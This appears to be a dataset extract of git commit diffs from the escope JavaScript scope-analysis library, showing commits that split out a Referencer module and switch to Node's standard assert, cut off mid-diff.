}<c><\n>-        CallExpression: function (node) {<\n>-            // Check this is direct call to eval<\n>-            if (!this.scopeManager.__ignoreEval() && node.callee.type === Syntax.Identifier && node.callee.name === 'eval') {<\n>-                // NOTE: This should be `variableScope`. Since direct eval call always creates Lexical environment and<\n>-                // let / const should be enclosed into it. Only VariableDeclaration affects on the caller's environment.<\n>-                this.currentScope().variableScope.__detectEval();<\n>-            }<\n>-            this.visitChildren(node);<\n>-        }<c><\n>-        BlockStatement: function (node) {<\n>-            if (this.scopeManager.__isES6()) {<\n>-                this.scopeManager.__nestScope(node);<\n>-            }<\n>-            this.visitChildren(node);<\n>-            this.close(node);<\n>-        }<c><\n>-        ThisExpression: function () {<\n>-            this.currentScope().variableScope.__detectThis();<\n>-        }<c><\n>-        WithStatement: function (node) {<\n>-            this.visit(node.object);<\n>-            // Then nest scope for WithStatement.<\n>-            this.scopeManager.__nestScope(node);<\n>-            this.visit(node.body);<\n>-            this.close(node);<\n>-        }<c><\n>-        VariableDeclaration: function (node) {<\n>-            var variableTargetScope<c> i<c> iz<c> decl;<\n>-            variableTargetScope = (node.kind === 'var') ? this.currentScope().variableScope : this.currentScope();<\n>-            for (i = 0<c> iz = node.declarations.length; i < iz; ++i) {<\n>-                decl = node.declarations[i];<\n>-                this.visitVariableDeclaration(variableTargetScope<c> Variable.Variable<c> node<c> i);<\n>-                if (decl.init) {<\n>-                    this.visit(decl.init);<\n>-                }<\n>-            }<\n>-        }<c><\n>-        // sec 13.11.8<\n>-        SwitchStatement: function (node) {<\n>-            var i<c> iz;<\n>-            this.visit(node.discriminant);<\n>-            if (this.scopeManager.__isES6()) {<\n>-                this.scopeManager.__nestScope(node);<\n>-            }<\n>-            for (i = 0<c> iz = node.cases.length; i < iz; ++i) {<\n>-                this.visit(node.cases[i]);<\n>-            }<\n>-            this.close(node);<\n>-        }<c><\n>-        FunctionDeclaration: function (node) {<\n>-            this.visitFunction(node);<\n>-        }<c><\n>-        FunctionExpression: function (node) {<\n>-            this.visitFunction(node);<\n>-        }<c><\n>-        ForOfStatement: function (node) {<\n>-            this.visitForIn(node);<\n>-        }<c><\n>-        ForInStatement: function (node) {<\n>-            this.visitForIn(node);<\n>-        }<c><\n>-        ArrowFunctionExpression: function (node) {<\n>-            this.visitFunction(node);<\n>-        }<c><\n>-        ImportDeclaration: function (node) {<\n>-            var importer;<\n>-            assert(this.scopeManager.__isES6() && this.scopeManager.isModule()<c> 'ImportDeclaration should appear when the mode is ES6 and in the module context.');<\n>-            importer = new Importer(node<c> this);<\n>-            importer.visit(node);<\n>-        }<c><\n>-        ExportDeclaration: function (node) {<\n>-            if (node.source) {<\n>-                return;<\n>-            }<\n>-            if (node.declaration) {<\n>-                this.visit(node.declaration);<\n>-                return;<\n>-            }<\n>-            this.visitChildren(node);<\n>-        }<c><\n>-        ExportSpecifier: function (node) {<\n>-            this.visit(node.id);<\n>-        }<\n>-    });<\n>-    module.exports = Referencer;<\n>-/* vim: set sw=4 ts=4 et tw=80 : */<\n>-    ""estraverse"": "">=1.9.1""<c><\n>-    ""object-assign"": ""^2.0.0""<\n>-    ""jsdoc"": ""=3.3.0-alpha2""<c><\n>-    ""jsdoc"": ""jsdoc lib/*.js README.md""<\n>-(function () {<\n>-    'use strict';<\n>-    /**<\n>-     * @class Definition<\n>-     */<\n>-    function Definition(type<c> name<c> node<c> parent<c> index<c> kind) {<\n>-    module.exports = Definition;<\n>- * @module<\n>-(function () {<\n>-    'use strict';<\n>-    var ScopeManager<c><\n>-        Referencer<c><\n>-        assert;<\n>-    ScopeManager = require('./scope-manager');<\n>-    Referencer = require('./referencer');<\n>-    assert = require('assert');<\n>-    function defaultOptions() {<\n>-        return {<\n>-            optimistic: false<c><\n>-            directive: false<c><\n>-            sourceType: 'script'<c>  // one of ['script'<c> 'module']<\n>-            ecmaVersion: 5<\n>-        };<\n>-    }<\n>-    function updateDeeply(target<c> override) {<\n>-        var key<c> val;<\n>-        function isHashObject(target) {<\n>-            return typeof target === 'object' && target instanceof Object && !(target instanceof RegExp);<\n>-        }<\n>-        for (key in override) {<\n>-            if (override.hasOwnProperty(key)) {<\n>-                val = override[key];<\n>-                if (isHashObject(val)) {<\n>-                    if (isHashObject(target[key])) {<\n>-                        updateDeeply(target[key]<c> val);<\n>-                    } else {<\n>-                        target[key] = updateDeeply({}<c> val);<\n>-                    }<\n>-                    target[key] = val;<\n>-        return target;<\n>-    /**<\n>-     * Main interface function. Takes an Esprima syntax tree and returns the<\n>-     * analyzed scopes.<\n>-     * @function analyze<\n>-     * @param {esprima.Tree} tree<\n>-     * @param {Object} providedOptions - Options that tailor the scope analysis<\n>-     * @param {boolean} [providedOptions.optimistic=false] - the optimistic flag<\n>-     * @param {boolean} [providedOptions.directive=false]- the directive flag<\n>-     * @param {boolean} [providedOptions.ignoreEval=false]- whether to check 'eval()' calls<\n>-     * @param {string} [providedOptions.sourceType='script']- the source type of the script. one of 'script' and 'module'<\n>-     * @param {number} [providedOptions.ecmaVersion=5]- which ECMAScript version is considered<\n>-     * @return {ScopeManager}<\n>-     */<\n>-    function analyze(tree<c> providedOptions) {<\n>-        var scopeManager<c> referencer<c> options;<\n>-        options = updateDeeply(defaultOptions()<c> providedOptions);<\n>-        scopeManager = new ScopeManager(options);<\n>-        referencer = new Referencer(scopeManager);<\n>-        referencer.visit(tree);<\n>-        assert(scopeManager.__currentScope === null<c> 'currentScope should be null.');<\n>-        return scopeManager;<\n>-    }<\n>-    exports.version = require('../package.json').version;<\n>-    exports.Reference = require('./reference');<\n>-    exports.Variable = require('./variable');<\n>-    exports.Scope = require('./scope');<\n>-    exports.ScopeManager = ScopeManager;<\n>-    /** @name module:escope.analyze */<\n>-    exports.analyze = analyze;<\n>-(function () {<\n>-    'use strict';<\n>-    /**<\n>-     * A Reference represents a single occurrence of an identifier in code.<\n>-     * @class Reference<\n>-     */<\n>-    function Reference(ident<c> scope<c> flag<c> writeExpr<c> maybeImplicitGlobal<c> partial) {<\n>-    /**<\n>-     * @constant Reference.READ<\n>-     * @private<\n>-     */<\n>-    Reference.READ = 0x1;<\n>-    /**<\n>-     * @constant Reference.WRITE<\n>-     * @private<\n>-     */<\n>-    Reference.WRITE = 0x2;<\n>-    /**<\n>-     * @constant Reference.RW<\n>-     * @private<\n>-     */<\n>-    Reference.RW = Reference.READ | Reference.WRITE;<\n>-    Reference.prototype.isStatic = function isStatic() {<\n>-    };<\n>-    Reference.prototype.isWrite = function isWrite() {<\n>-    };<\n>-    Reference.prototype.isRead = function isRead() {<\n>-    };<\n>-    Reference.prototype.isReadOnly = function isReadOnly() {<\n>-    };<\n>-    Reference.prototype.isWriteOnly = function isWriteOnly() {<\n>-    };<\n>-    Reference.prototype.isReadWrite = function isReadWrite() {<\n>-    };<\n>-    module.exports = Reference;<\n>-(function () {<\n>-    'use strict';<\n>-    var WeakMap<c> Scope;<\n>-    WeakMap = require('es6-weak-map');<\n>-    Scope = require('./scope');<\n>-    /**<\n>-     * @class ScopeManager<\n>-     */<\n>-    function ScopeManager(options) {<\n>-    ScopeManager.prototype.__useDirective = function () {<\n>-    };<\n>-    ScopeManager.prototype.__isOptimistic = function () {<\n>-    };<\n>-    ScopeManager.prototype.__ignoreEval = function () {<\n>-    };<\n>-    ScopeManager.prototype.isModule = function () {<\n>-    };<\n>-    ScopeManager.prototype.__get = function __get(node) {<\n>-    };<\n>-    ScopeManager.prototype.acquire = function acquire(node<c> inner) {<\n>-    };<\n>-    ScopeManager.prototype.acquireAll = function acquire(node) {<\n>-    };<\n>-    ScopeManager.prototype.release = function release(node<c> inner) {<\n>-    };<\n>-    ScopeManager.prototype.attach = function attach() { };<\n>-    ScopeManager.prototype.detach = function detach() { };<\n>-    ScopeManager.prototype.__nestScope = function (node<c> isMethodDefinition) {<\n>-    };<\n>-    ScopeManager.prototype.__nestModuleScope = function (node) {<\n>-    };<\n>-    ScopeManager.prototype.__nestTDZScope = function (node) {<\n>-    };<\n>-    ScopeManager.prototype.__nestFunctionExpressionNameScope = function (node<c> isMethodDefinition) {<\n>-    };<\n>-    ScopeManager.prototype.__isES6 = function () {<\n>-    };<\n>-    module.exports = ScopeManager;<\n>-(function () {<\n>-    'use strict';<\n>-    var Syntax<c><\n>-        Map<c><\n>-        Reference<c><\n>-        Variable<c><\n>-        Definition<c><\n>-        assert;<\n>-    Syntax = require('estraverse').Syntax;<\n>-    Map = require('es6-map');<\n>-    Reference = require('./reference');<\n>-    Variable = require('./variable');<\n>-    Definition = require('./definition');<\n>-    assert = require('assert');<\n>-    function isStrictScope(scope<c> block<c> isMethodDefinition<c> useDirective) {<\n>-        var body<c> i<c> iz<c> stmt<c> expr;<\n>-        // When upper scope is exists and strict<c> inner scope is also strict.<\n>-        if (scope.upper && scope.upper.isStrict) {<\n>-            return true;<\n>-        }<\n>-        // ArrowFunctionExpression's scope is always strict scope.<\n>-        if (block.type === Syntax.ArrowFunctionExpression) {<\n>-            return true;<\n>-        }<\n>-        if (isMethodDefinition) {<\n>-            return true;<\n>-        }<\n>-        if (scope.type === 'class' || scope.type === 'module') {<\n>-            return true;<\n>-        }<\n>-        if (scope.type === 'block' || scope.type === 'switch') {<\n>-            return false;<\n>-        }<\n>-        if (scope.type === 'function') {<\n>-            body = block.body;<\n>-        } else if (scope.type === 'global') {<\n>-            body = block;<\n>-        } else {<\n>-            return false;<\n>-        // Search 'use strict' directive.<\n>-        if (useDirective) {<\n>-            for (i = 0<c> iz = body.body.length; i < iz; ++i) {<\n>-                stmt = body.body[i];<\n>-                if (stmt.type !== 'DirectiveStatement') {<\n>-                    break;<\n>-                }<\n>-                if (stmt.raw === '""use strict""' || stmt.raw === '\'use strict\'') {<\n>-                    return true;<\n>-                }<\n>-        } else {<\n>-            for (i = 0<c> iz = body.body.length; i < iz; ++i) {<\n>-                stmt = body.body[i];<\n>-                if (stmt.type !== Syntax.ExpressionStatement) {<\n>-                    break;<\n>-                }<\n>-                expr = stmt.expression;<\n>-                if (expr.type !== Syntax.Literal || typeof expr.value !== 'string') {<\n>-                    break;<\n>-                if (expr.raw != null) {<\n>-                    if (expr.raw === '""use strict""' || expr.raw === '\'use strict\'') {<\n>-                        return true;<\n>-                    }<\n>-                } else {<\n>-                    if (expr.value === 'use strict') {<\n>-                        return true;<\n>-                    }<\n>-        return false;<\n>-    function registerScope(scopeManager<c> scope) {<\n>-        var scopes;<\n>-        scopeManager.scopes.push(scope);<\n>-        scopes = scopeManager.__nodeToScope.get(scope.block);<\n>-        if (scopes) {<\n>-            scopes.push(scope);<\n>-        } else {<\n>-            scopeManager.__nodeToScope.set(scope.block<c> [ scope ]);<\n>-        }<\n>-    /* Special Scope types. */<\n>-    var SCOPE_NORMAL = 0<c><\n>-        SCOPE_MODULE = 1<c><\n>-        SCOPE_FUNCTION_EXPRESSION_NAME = 2<c><\n>-        SCOPE_TDZ = 3;<\n>-    /**<\n>-     * @class Scope<\n>-     */<\n>-    function Scope(scopeManager<c> block<c> isMethodDefinition<c> scopeType) {<\n>-    Scope.prototype.__close = function __close(scopeManager) {<\n>-    };<\n>-    Scope.prototype.__resolve = function __resolve(ref) {<\n>-    };<\n>-    Scope.prototype.__delegateToUpperScope = function __delegateToUpperScope(ref) {<\n>-    };<\n>-    Scope.prototype.__defineGeneric = function (name<c> set<c> variables<c> node<c> def) {<\n>-    };<\n>-    Scope.prototype.__defineArguments = function () {<\n>-    };<\n>-    Scope.prototype.__defineImplicit = function (node<c> def) {<\n>-    };<\n>-    Scope.prototype.__define = function (node<c> def) {<\n>-    };<\n>-    Scope.prototype.__referencing = function __referencing(node<c> assign<c> writeExpr<c> maybeImplicitGlobal<c> partial) {<\n>-    };<\n>-    Scope.prototype.__detectEval = function __detectEval() {<\n>-    };<\n>-    Scope.prototype.__detectThis = function __detectThis() {<\n>-    };<\n>-    Scope.prototype.__isClosed = function isClosed() {<\n>-    };<\n>-    // API Scope#resolve(name)<\n>-    // returns resolved reference<\n>-    Scope.prototype.resolve = function resolve(ident) {<\n>-    };<\n>-    // API Scope#isStatic<\n>-    // returns this scope is static<\n>-    Scope.prototype.isStatic = function isStatic() {<\n>-    };<\n>-    // API Scope#isArgumentsMaterialized<\n>-    // return this scope has materialized arguments<\n>-    Scope.prototype.isArgumentsMaterialized = function isArgumentsMaterialized() {<\n>-    };<\n>-    // API Scope#isThisMaterialized<\n>-    // return this scope has materialized `this` reference<\n>-    Scope.prototype.isThisMaterialized = function isThisMaterialized() {<\n>-    };<\n>-    Scope.prototype.isUsedName = function (name) {<\n>-    };<\n>-    Scope.SCOPE_NORMAL = SCOPE_NORMAL;<\n>-    Scope.SCOPE_MODULE = SCOPE_MODULE;<\n>-    Scope.SCOPE_FUNCTION_EXPRESSION_NAME = SCOPE_FUNCTION_EXPRESSION_NAME;<\n>-    Scope.SCOPE_TDZ = SCOPE_TDZ;<\n>-    module.exports = Scope;<\n>-(function () {<\n>-    'use strict';<\n>-    /**<\n>-     * A Variable represents a locally scoped identifier. These include arguments to<\n>-     * functions.<\n>-     * @class Variable<\n>-     */<\n>-    function Variable(name<c> scope) {<\n>-    Variable.CatchClause = 'CatchClause';<\n>-    Variable.Parameter = 'Parameter';<\n>-    Variable.FunctionName = 'FunctionName';<\n>-    Variable.ClassName = 'ClassName';<\n>-    Variable.Variable = 'Variable';<\n>-    Variable.ImportBinding = 'ImportBinding';<\n>-    Variable.TDZ = 'TDZ';<\n>-    Variable.ImplicitGlobalVariable = 'ImplicitGlobalVariable';<\n>-    module.exports = Variable;<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,3,22,5 Jan 2015,Use standard library assert,1,0,3,51,2718,+        assert;<\n>+    assert = require('assert');<\n>+        assert(scopeManager.__currentScope === null<c> 'currentScope should be null.');<\n>+        assert<c><\n>+    assert = require('assert');<\n>+            assert(this.scopeManager.__isES6() && this.scopeManager.isModule()<c> 'ImportDeclaration should appear when the mode is ES6 and in the module context.');<\n>+        assert;<\n>+    assert = require('assert');<\n>+        assert(this.__isClosed()<c> 'Scope should be closed.');<\n>+        assert(ident.type === Syntax.Identifier<c> 'Target should be identifier.');<\n>+        assert(variable<c> 'Always have arguments variable.');<\n>,"-        utility;<\n>-    utility = require('./utility');<\n>-        utility.assert(scopeManager.__currentScope === null);<\n>-        utility<c><\n>-    utility = require('./utility');<\n>-            utility.assert(this.scopeManager.__isES6() && this.scopeManager.isModule());<\n>-        utility;<\n>-    utility = require('./utility');<\n>-        utility.assert(this.__isClosed()<c> 'scope should be closed');<\n>-        utility.assert(ident.type === Syntax.Identifier<c> 'target should be identifier');<\n>-        utility.assert(variable<c> 'always have arguments variable');<\n>-/*<\n>-  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>-  Redistribution and use in source and binary forms<c> with or without<\n>-  modification<c> are permitted provided that the following conditions are met:<\n>-    * Redistributions of source code must retain the above copyright<\n>-      notice<c> this list of conditions and the following disclaimer.<\n>-    * Redistributions in binary form must reproduce the above copyright<\n>-      notice<c> this list of conditions and the following disclaimer in the<\n>-      documentation and/or other materials provided with the distribution.<\n>-  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>-  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>-  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>-  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>-  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>-  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>-  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>-  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>-  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>-  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>-*/<\n>-(function () {<\n>-    'use strict';<\n>-    function assert(cond<c> text) {<\n>-        if (!cond) {<\n>-            throw new Error(text);<\n>-        }<\n>-    }<\n>-    exports.assert = assert;<\n>-/* vim: set sw=4 ts=4 et tw=80 : */<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,3,18,5 Jan 2015,Split into lib/referencer.js,0,1,1,958,40311,"+    var ScopeManager<c><\n>+        Referencer<c><\n>+        utility;<\n>+    Referencer = require('./referencer');<\n>+    exports.Reference = require('./reference');<\n>+    exports.Variable = require('./variable');<\n>+    exports.Scope = require('./scope');<\n>+/*<\n>+  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>+  Redistribution and use in source and binary forms<c> with or without<\n>+  modification<c> are permitted provided that the following conditions are met:<\n>+    * Redistributions of source code must retain the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer.<\n>+    * Redistributions in binary form must reproduce the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer in the<\n>+      documentation and/or other materials provided with the distribution.<\n>+  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+*/<\n>+(function () {<\n>+    'use strict';<\n>+    var Syntax<c><\n>+        Reference<c><\n>+        Variable<c><\n>+        Definition<c><\n>+        utility<c><\n>+        util<c><\n>+        objectAssign<c><\n>+        estraverse<c><\n>+        esrecurse;<\n>+    util = require('util');<\n>+    objectAssign = require('object-assign');<\n>+    estraverse = require('estraverse');<\n>+    esrecurse = require('esrecurse');<\n>+    Syntax = estraverse.Syntax;<\n>+    Reference = require('./reference');<\n>+    Variable = require('./variable');<\n>+    Definition = require('./definition');<\n>+    utility = require('./utility');<\n>+    function traverseIdentifierInPattern(rootPattern<c> callback) {<\n>+        estraverse.traverse(rootPattern<c> {<\n>+            enter: function (pattern<c> parent) {<\n>+                var i<c> iz<c> element<c> property;<\n>+                switch (pattern.type) {<\n>+                    case Syntax.Identifier:<\n>+                        // Toplevel identifier.<\n>+                        if (parent === null) {<\n>+                            callback(pattern<c> true);<\n>+                        }<\n>+                        break;<\n>+                    case Syntax.SpreadElement:<\n>+                        if (pattern.argument.type === Syntax.Identifier) {<\n>+                            callback(pattern.argument<c> false);<\n>+                        }<\n>+                        break;<\n>+                    case Syntax.ObjectPattern:<\n>+                        for (i = 0<c> iz = pattern.properties.length; i < iz; ++i) {<\n>+                            property = pattern.properties[i];<\n>+                            if (property.shorthand) {<\n>+                                callback(property.key<c> false);<\n>+                                continue;<\n>+                            }<\n>+                            if (property.value.type === Syntax.Identifier) {<\n>+                                callback(property.value<c> false);<\n>+                                continue;<\n>+                            }<\n>+                        }<\n>+                        break;<\n>+                    case Syntax.ArrayPattern:<\n>+                        for (i = 0<c> iz = pattern.elements.length; i < iz; ++i) {<\n>+                            element = pattern.elements[i];<\n>+                            if (element && element.type === Syntax.Identifier) {<\n>+                                callback(element<c> false);<\n>+                            }<\n>+                        }<\n>+                        break;<\n>+                }<\n>+            }<\n>+        });<\n>+    }<\n>+    function isPattern(node) {<\n>+        var nodeType = node.type;<\n>+        return nodeType === Syntax.Identifier || nodeType === Syntax.ObjectPattern || nodeType === Syntax.ArrayPattern || nodeType === Syntax.SpreadElement;<\n>+    }<\n>+    // Importing ImportDeclaration.<\n>+    // http://people.mozilla.org/~jorendorff/es6-draft.html#sec-moduledeclarationinstantiation<\n>+    // FIXME: Now<c> we don't create module environment<c> because the context is<\n>+    // implementation dependent.<\n>+    function Importer(declaration<c> referencer) {<\n>+        esrecurse.Visitor.call(this<c> this);<\n>+        this.declaration = declaration;<\n>+        this.referencer = referencer;<\n>+    }<\n>+    util.inherits(Importer<c> esrecurse.Visitor);<\n>+    objectAssign(Importer.prototype<c> {<\n>+        visitImport: function (id<c> specifier) {<\n>+            var that = this;<\n>+            that.referencer.visitPattern(id<c> function (pattern) {<\n>+                that.referencer.currentScope().__define(pattern<c><\n>+                    new Definition(<\n>+                        Variable.ImportBinding<c><\n>+                        pattern<c><\n>+                        specifier<c><\n>+                        that.declaration<c><\n>+                        null<c><\n>+                        null<\n>+                        ));<\n>+            });<\n>+        }<c><\n>+        ImportNamespaceSpecifier: function (node) {<\n>+            if (node.id) {<\n>+                this.visitImport(node.id<c> node);<\n>+            }<\n>+        }<c><\n>+        ImportDefaultSpecifier: function (node) {<\n>+            this.visitImport(node.id<c> node);<\n>+        }<c><\n>+        ImportSpecifier: function (node) {<\n>+            if (node.name) {<\n>+                this.visitImport(node.name<c> node);<\n>+            } else {<\n>+                this.visitImport(node.id<c> node);<\n>+            }<\n>+        }<\n>+    });<\n>+    // Referencing variables and creating bindings.<\n>+    function Referencer(scopeManager) {<\n>+        esrecurse.Visitor.call(this<c> this);<\n>+        this.scopeManager = scopeManager;<\n>+        this.parent = null;<\n>+        this.isInnerMethodDefinition = false;<\n>+    }<\n>+    util.inherits(Referencer<c> esrecurse.Visitor);<\n>+    objectAssign(Referencer.prototype<c> {<\n>+        currentScope: function () {<\n>+            return this.scopeManager.__currentScope;<\n>+        }<c><\n>+        close: function (node) {<\n>+            while (this.currentScope() && node === this.currentScope().block) {<\n>+                this.currentScope().__close(this.scopeManager);<\n>+            }<\n>+        }<c><\n>+        pushInnerMethodDefinition: function (isInnerMethodDefinition) {<\n>+            var previous = this.isInnerMethodDefinition;<\n>+            this.isInnerMethodDefinition = isInnerMethodDefinition;<\n>+            return previous;<\n>+        }<c><\n>+        popInnerMethodDefinition: function (isInnerMethodDefinition) {<\n>+            this.isInnerMethodDefinition = isInnerMethodDefinition;<\n>+        }<c><\n>+        materializeTDZScope: function (node<c> iterationNode) {<\n>+            // http://people.mozilla.org/~jorendorff/es6-draft.html#sec-runtime-semantics-forin-div-ofexpressionevaluation-abstract-operation<\n>+            // TDZ scope hides the declaration's names.<\n>+            this.scopeManager.__nestTDZScope(node<c> iterationNode);<\n>+            this.visitVariableDeclaration(this.currentScope()<c> Variable.TDZ<c> iterationNode.left<c> 0);<\n>+        }<c><\n>+        materializeIterationScope: function (node) {<\n>+            // Generate iteration scope for upper ForIn/ForOf Statements.<\n>+            // parent node for __nestScope is only necessary to<\n>+            // distinguish MethodDefinition.<\n>+            var letOrConstDecl<c> that = this;<\n>+            this.scopeManager.__nestScope(node<c> false);<\n>+            letOrConstDecl = node.left;<\n>+            this.visitVariableDeclaration(this.currentScope()<c> Variable.Variable<c> letOrConstDecl<c> 0);<\n>+            this.visitPattern(letOrConstDecl.declarations[0].id<c> function (pattern) {<\n>+                that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>+            });<\n>+        }<c><\n>+        visitPattern: function (node<c> callback) {<\n>+            traverseIdentifierInPattern(node<c> callback);<\n>+        }<c><\n>+        visitFunction: function (node) {<\n>+            var i<c> iz<c> that = this;<\n>+            // FunctionDeclaration name is defined in upper scope<\n>+            // NOTE: Not referring variableScope. It is intended.<\n>+            // Since<\n>+            //  in ES5<c> FunctionDeclaration should be in FunctionBody.<\n>+            //  in ES6<c> FunctionDeclaration should be block scoped.<\n>+            if (node.type === Syntax.FunctionDeclaration) {<\n>+                // id is defined in upper scope<\n>+                this.currentScope().__define(node.id<c><\n>+                        new Definition(<\n>+                            Variable.FunctionName<c><\n>+                            node.id<c><\n>+                            node<c><\n>+                            null<c><\n>+                            null<c><\n>+                            null<\n>+                        ));<\n>+            }<\n>+            // Consider this function is in the MethodDefinition.<\n>+            this.scopeManager.__nestScope(node<c> this.isInnerMethodDefinition);<\n>+            for (i = 0<c> iz = node.params.length; i < iz; ++i) {<\n>+                this.visitPattern(node.params[i]<c> function (pattern) {<\n>+                    that.currentScope().__define(pattern<c><\n>+                        new Definition(<\n>+                            Variable.Parameter<c><\n>+                            pattern<c><\n>+                            node<c><\n>+                            null<c><\n>+                            i<c><\n>+                            null<\n>+                        ));<\n>+                });<\n>+            }<\n>+            // Skip BlockStatement to prevent creating BlockStatement scope.<\n>+            if (node.body.type === Syntax.BlockStatement) {<\n>+                this.visitChildren(node.body);<\n>+            } else {<\n>+                this.visit(node.body);<\n>+            }<\n>+            this.close(node);<\n>+        }<c><\n>+        visitClass: function (node) {<\n>+            if (node.type === Syntax.ClassDeclaration) {<\n>+                this.currentScope().__define(node.id<c><\n>+                        new Definition(<\n>+                            Variable.ClassName<c><\n>+                            node.id<c><\n>+                            node<c><\n>+                            null<c><\n>+                            null<c><\n>+                            null<\n>+                        ));<\n>+            }<\n>+            // FIXME: Maybe consider TDZ.<\n>+            this.visit(node.superClass);<\n>+            this.scopeManager.__nestScope(node);<\n>+            if (node.id) {<\n>+                this.currentScope().__define(node.id<c><\n>+                        new Definition(<\n>+                            Variable.ClassName<c><\n>+                            node.id<c><\n>+                            node<\n>+                        ));<\n>+            }<\n>+            this.visit(node.body);<\n>+            this.close(node);<\n>+        }<c><\n>+        visitProperty: function (node) {<\n>+            var previous<c> isMethodDefinition;<\n>+            if (node.computed) {<\n>+                this.visit(node.key);<\n>+            }<\n>+            isMethodDefinition = node.type === Syntax.MethodDefinition || node.method;<\n>+            if (isMethodDefinition) {<\n>+                previous = this.pushInnerMethodDefinition(true);<\n>+            }<\n>+            this.visit(node.value);<\n>+            if (isMethodDefinition) {<\n>+                this.popInnerMethodDefinition(previous);<\n>+            }<\n>+        }<c><\n>+        visitForIn: function (node) {<\n>+            var that = this;<\n>+            if (node.left.type === Syntax.VariableDeclaration && node.left.kind !== 'var') {<\n>+                this.materializeTDZScope(node.right<c> node);<\n>+                this.visit(node.right);<\n>+                this.close(node.right);<\n>+                this.materializeIterationScope(node);<\n>+                this.visit(node.body);<\n>+                this.close(node);<\n>+            } else {<\n>+                if (node.left.type === Syntax.VariableDeclaration) {<\n>+                    this.visit(node.left);<\n>+                    this.visitPattern(node.left.declarations[0].id<c> function (pattern) {<\n>+                        that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>+                    });<\n>+                } else {<\n>+                    if (!isPattern(node.left)) {<\n>+                        this.visit(node.left);<\n>+                    }<\n>+                    this.visitPattern(node.left<c> function (pattern) {<\n>+                        var maybeImplicitGlobal = null;<\n>+                        if (!that.currentScope().isStrict) {<\n>+                            maybeImplicitGlobal = {<\n>+                                pattern: pattern<c><\n>+                                node: node<\n>+                            };<\n>+                        }<\n>+                        that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> true);<\n>+                    });<\n>+                }<\n>+                this.visit(node.right);<\n>+                this.visit(node.body);<\n>+            }<\n>+        }<c><\n>+        visitVariableDeclaration: function (variableTargetScope<c> type<c> node<c> index) {<\n>+            var decl<c> init<c> that = this;<\n>+            decl = node.declarations[index];<\n>+            init = decl.init;<\n>+            // FIXME: Don't consider initializer with complex patterns.<\n>+            // Such as<c><\n>+            // var [a<c> b<c> c = 20] = array;<\n>+            this.visitPattern(decl.id<c> function (pattern<c> toplevel) {<\n>+                variableTargetScope.__define(pattern<c><\n>+                    new Definition(<\n>+                        type<c><\n>+                        pattern<c><\n>+                        decl<c><\n>+                        node<c><\n>+                        index<c><\n>+                        node.kind<\n>+                    ));<\n>+                if (init) {<\n>+                    that.currentScope().__referencing(pattern<c> Reference.WRITE<c> init<c> null<c> !toplevel);<\n>+                }<\n>+            });<\n>+        }<c><\n>+        AssignmentExpression: function (node) {<\n>+            var that = this;<\n>+            if (isPattern(node.left)) {<\n>+                if (node.operator === '=') {<\n>+                    this.visitPattern(node.left<c> function (pattern<c> toplevel) {<\n>+                        var maybeImplicitGlobal = null;<\n>+                        if (!that.currentScope().isStrict) {<\n>+                            maybeImplicitGlobal = {<\n>+                                pattern: pattern<c><\n>+                                node: node<\n>+                            };<\n>+                        }<\n>+                        that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> !toplevel);<\n>+                    });<\n>+                } else {<\n>+                    that.currentScope().__referencing(node.left<c> Reference.RW<c> node.right);<\n>+                }<\n>+            } else {<\n>+                this.visit(node.left);<\n>+            }<\n>+            this.visit(node.right);<\n>+        }<c><\n>+        CatchClause: function (node) {<\n>+            var that = this;<\n>+            this.scopeManager.__nestScope(node);<\n>+            this.visitPattern(node.param<c> function (pattern) {<\n>+                that.currentScope().__define(pattern<c><\n>+                    new Definition(<\n>+                        